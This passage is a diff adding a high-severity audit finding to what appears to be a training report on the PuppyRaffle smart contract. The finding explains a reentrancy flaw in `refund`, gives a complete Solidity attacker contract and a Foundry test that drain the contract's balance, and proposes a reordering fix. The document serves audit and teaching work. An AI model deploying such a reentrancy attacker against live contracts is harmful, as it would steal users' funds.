@@ -164,4 +164,104 @@ Everytime you call `players.length` you read from storage, as opposed to opposed
 
 
 
+### [H-1]  Reentrancy attack in `PuppyRaffle::refund` allows entrant to raffle balance 
+
+**Description:** The `PuppyRaffle::refund` function does not follow CEI(Checks, Effects, Interaction) and as a result, enables participants to drain the contract balance.
+
+In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.
+
+```javascript
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(
+            playerAddress == msg.sender,
+            "PuppyRaffle: Only the player can refund"
+        );
+        require(
+            playerAddress != address(0),
+            "PuppyRaffle: Player already refunded, or is not active"
+        );
+
+@>        payable(msg.sender).sendValue(entranceFee);
+@>
+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+```
+
+A player who has entered the rafle can have a `fallback`/`recieve` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract is drained.
+
+**Impact:** All fees paid by the raffle entrants could be stolen by the malicious participant. 
+
+**Proof of Concept:** 
+1. user enters the raffle
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
+3. Attacker enters the raffle.
+4. Attacker cals `PuppyRaffle::refund` from their attack contract, draining the contrct balance.
+
+**Proof of Code**
+
+<details>
+<summary>Code</summary>
+
+Add the following code to the `PuppyRaffleTest.t.sol` file.
+
+```javascript
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+
+function testReentrance() public playersEntered {
+    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
+    vm.deal(address(attacker), 1e18);
+    uint256 startingAttackerBalance = address(attacker).balance;
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+
+    attacker.attack();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+    assertEq(endingContractBalance, 0);
+}
+```
+</details>
+
+**Recomended Mitigation:** To fix this, we should have the PuppyRaffle::refund function update the players array before making the external call. Additionally, we should move the event emission up as well.
+
+```diff
+        function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+        (bool success,) = msg.sender.call{value: entranceFee}("");
+        require(success, "PuppyRaffle: Failed to refund player");
+-        players[playerIndex] = address(0);
+-        emit RaffleRefunded(playerAddress);
+    }
+```
+
 ###
